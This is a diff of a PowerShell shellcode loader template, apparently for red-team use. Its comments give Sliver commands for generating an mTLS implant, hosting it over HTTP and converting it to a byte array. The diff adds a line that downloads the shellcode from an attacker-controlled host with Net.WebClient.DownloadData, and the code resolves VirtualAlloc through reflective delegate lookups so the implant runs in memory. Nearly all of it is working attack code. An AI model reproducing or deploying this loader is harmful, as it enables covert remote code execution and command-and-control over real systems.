@@ -1,17 +1,13 @@
 # =============================================================================
-# TEMPLATE — replace $buf with your actual shellcode before running
+# TEMPLATE — set $buf to your shellcode before running
 #
-# Generate shellcode (Sliver) and convert to a PowerShell byte array:
+# Full implant is multi-MB → download it at runtime (don't paste inline):
 #   sliver > generate --mtls <IP>:<PORT> --format shellcode --save /tmp/sc.bin
-#   python3 sliver/sliver2arrays.py /tmp/sc.bin --ps1
+#   python3 -m http.server 80          # host /tmp/sc.bin
 #
-# Then replace the $buf line below with the full byte array from that output.
-#
-# NOTE: a full Sliver session implant is multi-MB (Go runtime) — pasting it as one
-# inline [Byte[]] $buf line is impractical and slow. Use a small stage-1 stager
-# (Armory beignet/malasada, a few hundred bytes) instead, or populate $buf at
-# runtime via (New-Object Net.WebClient).DownloadData('http://<IP>/sc.bin') so the
-# raw blob stays off the script.
+# Small shellcode (a stager) → paste the byte array inline instead:
+#   sliver > generate --mtls <IP>:<PORT> --format shellcode --save /tmp/stager.bin
+#   python3 sliver/sliver2arrays.py /tmp/stager.bin --ps1
 # =============================================================================
 
 function getDelegateType {
@@ -51,7 +47,11 @@ function LookupFunc {
     return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
 }
 
-[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0 # ← replace with your full shellcode
+# Full implant (multi-MB): download at runtime
+[Byte[]] $buf = (New-Object System.Net.WebClient).DownloadData('http://<IP>/sc.bin')
+
+# OR small shellcode (stager): paste the bytes inline
+# [Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0
 
 # Allocate exactly the shellcode size (Sliver shellcode is MBs — a fixed 0x1000 would fail)
 $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc 'kernel32.dll' 'VirtualAlloc'), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
